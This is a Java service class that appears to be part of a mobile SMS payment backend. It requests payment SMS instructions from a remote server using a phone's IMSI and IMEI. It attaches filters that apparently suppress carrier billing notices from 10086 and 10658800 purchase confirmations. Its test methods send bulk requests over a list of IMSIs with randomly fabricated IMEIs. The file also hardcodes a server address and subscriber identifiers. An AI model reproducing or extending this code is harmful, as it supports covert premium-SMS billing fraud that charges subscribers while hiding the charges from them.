package com.jxt.pay.appclient.service.dynamic.net;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Random;

import org.apache.commons.io.FileUtils;
import org.apache.log4j.Logger;
import org.json.JSONObject;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sets;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;
import com.jxt.pay.appclient.utils.PostData;
import com.jxt.pay.appclient.utils.SingleXmlUtil;
import com.jxt.pay.appclient.utils.StringUtils;

/**
 * 强联网
 * 
 * @author leoliu
 *
 */
public class LxtxSmm2DynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(LxtxSmm2DynamicService.class);
	
	private static final String TYPE = "lxtxSmm2";
	
	private static final String PARAM = "AppID={appid}&PayCode={payCode}&Imsi={imsi}&Imei={imei}&UA=Huawei&Channel={channel}&count={count}";
	
	private int timeOut = 60;
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	private static final Guard guard1 = new Guard("10658800","成功购买",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658800","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String appid = StringUtils.defaultString(map.get("appid"));
			String imsi = StringUtils.defaultString(map.get("imsi"));
			String imei = StringUtils.defaultString(map.get("imei"));
			String payCode = StringUtils.defaultString(map.get("payCode"));
			String province = map.get("province");
			String _count = map.get("count");
			int count = 1;
			
			if(_count != null && _count.length() > 0){
				try {
					count = Integer.parseInt(_count);
				} catch (NumberFormatException e) {
					e.printStackTrace();
				}
			}
			
			
			if(province == null || province.length() == 0){
				province = "8611";
			}
			
			String _channel = "";
			
			if(channel != null && channel.length() > 6){
				_channel = channel.substring(0,6)+province;
			}
			
			String param = PARAM.replace("{appid}",appid).replace("{imsi}",imsi).replace("{imei}",imei).replace("{payCode}", payCode).replace("{channel}", _channel).replace("{count}",""+count);
			
			String responseJson = GetData.getData(url,param);
			
			xml = parse(responseJson);
			
			if(xml != null && xml.length() > 0){
				tryMap.remove(channel);
			}else{
				return DynamicUtils.parseWait(10,map);
			}
		}
		
		return xml;
	}

	private String parse(String responseJson){
		
		if(responseJson != null && responseJson.length() > 0){
			logger.info("responseJson : "+responseJson);
			
			try{
				JSONObject jo = new JSONObject(responseJson);
				
				String status = jo.getString("status");
				
				if(!"2".equals(status)){
					Sms sms = new Sms();
					
					if("0".equals(status)){
						sms.setSmsContent(jo.getString("content"));
						sms.setSmsDest(jo.getString("num"));
						sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
					}
					
					List<Guard> guardList = new ArrayList<Guard>();
					guardList.add(guard1);
					guardList.add(guard2);
					guardList.add(guard3);
					guardList.add(guard4);
					
					sms.setGuardList(guardList);
					
					return XstreamHelper.toXml(sms).toString();
					
				}else{
					return DynamicUtils.parseError(jo.getString("error"));
				}
			}catch(Exception e){
				e.printStackTrace();
			}
		}
		
		return null;
	}
	
	
	public static void main(String[] args){
		
		test1();
	}
	
	private static String getImei(){
		return getRandom()+getRandom()+getRandom();
	}
	
	private static String getRandom(){
		int i = new Random().nextInt(100000);
		
		if(i < 10000){
			i = 10000 + i;
		}
		
		return i +"";
	}
	
	private static void test2(){
		File file = new File("e://imsi.txt");
		
		try {
			String sss = FileUtils.readFileToString(file);
		
			String[] arr = sss.split("\r\n");
		
			for(String imsi : arr){
				Map<String, String> map = new HashMap<String, String>();
				
				map.put("url", "http://119.29.52.164:8090/mm/mm2.do");
				map.put("channel", "106208a001001001");
				map.put("appid", "300008865444");
				map.put("imei",getImei());
				map.put("imsi", imsi);
				map.put("payCode","30000886544404");
				map.put("type","lxtxSmm2");
				
				String xml = new LxtxSmm2DynamicService().dynamic(map);
				
				logger.info(xml);
				
				try {
					Thread.sleep(1000 * 2);
				} catch (InterruptedException e) {
					e.printStackTrace();
				}
			}
		
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
	
	private static void test1(){
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url", "http://119.29.52.164:8090/mm/mm2.do");
		map.put("channel", "106208a001001001");
		
//		map.put("imei","860842023212255");
//		map.put("imsi", "460021845435067");
		
//		map.put("imsi", "460027241525071");//shuaka
		
		map.put("imei","862949029214504");
		map.put("imsi", "460022101441340");
		
		map.put("appid", "300008985767");
		map.put("payCode","30000898576704");
		map.put("count","1");
		
		map.put("type","lxtxSmm2");
		
		
		
		String xml = new LxtxSmm2DynamicService().dynamic(map);
		
		logger.info(xml);
	}
	
}
